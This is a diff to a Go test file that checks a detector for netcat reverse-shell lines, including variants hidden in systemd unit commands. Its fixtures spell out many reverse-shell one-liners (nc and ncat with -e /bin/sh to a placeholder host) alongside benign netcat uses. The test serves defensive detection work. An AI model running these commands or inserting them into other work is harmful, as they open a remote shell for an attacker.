@@ -142,3 +142,52 @@ func TestMatchLineFixRound1(t *testing.T) {
 		}
 	}
 }
+
+func TestMatchLineFixRound2(t *testing.T) {
+	hits := []string{
+		`nc 1.2.3.4 4444 2>&1 -e /bin/sh`,
+		`nc 1.2.3.4 4444 0<&1 -e /bin/sh`,
+		`nc 1.2.3.4 4444 >&2 -e /bin/sh`,
+		`nc 1.2.3.4 4444 &>/dev/null -e /bin/sh`,
+		`nc -e /bin/sh 1.2.3.4 4444 >/dev/null 2>&1`,
+		`nc 1.2.3.4 4444 -e/bin/sh`,
+		`ncat --exec=/bin/sh 1.2.3.4 4444`,
+		`ncat --sh-exec=/bin/sh 1.2.3.4 4444`,
+		`NC -e /bin/sh h p`,
+		`busybox nc h p -e sh`,
+		`ncat -e /bin/sh --ssl h p`,
+		`nc -lnvp 4444 -c /bin/sh`,
+		`nc h p -e "/bin/sh"`,
+		`(nc h p -e /bin/sh &)`,
+		`nohup nc h p -e /bin/sh &`,
+		`x=1 nc h p -e /bin/sh`,
+		`exec nc h p -c sh`,
+	}
+	for _, l := range hits {
+		if MatchLine(l) == "" {
+			t.Errorf("no hit: %s", l)
+		}
+	}
+	misses := []string{
+		`ProxyCommand nc -X connect -x proxy:8080 %h %p`,
+		`nc -q 1 -w 5 host 25 < /tmp/mail-cmd`,
+		`echo ok | nc -N host 9 ; echo -e done`,
+		`nc -z h 1 || echo -e "down"`,
+		`nc -w3 h 80 < req > resp; gzip -c resp > r.gz`,
+		`nc host 25 -C`,
+		`/usr/bin/nc.openbsd -zv h 22 -w 1`,
+		`printf x | nc h p | tee -a /var/log/x | grep -c ok`,
+		`nc -z db 5432 && tar -czf /backup/x.tgz /srv`,
+	}
+	for _, l := range misses {
+		if id := MatchLine(l); id != "" {
+			t.Errorf("false hit %s: %s", id, l)
+		}
+	}
+	// systemd command prefixes
+	for _, l := range []string{"ExecStart=-nc -e /bin/sh h p", "ExecStart=@/usr/bin/nc nc -e /bin/sh h p", "ExecStart=!!nc -e /bin/sh h p", "ExecStart=+nc -e /bin/sh h p", "ExecStart=:nc -e /bin/sh h p"} {
+		if got := Detect(model.PersistKindSystemdUnit, []string{l}); len(got) != 1 {
+			t.Errorf("unit line missed: %s", l)
+		}
+	}
+}
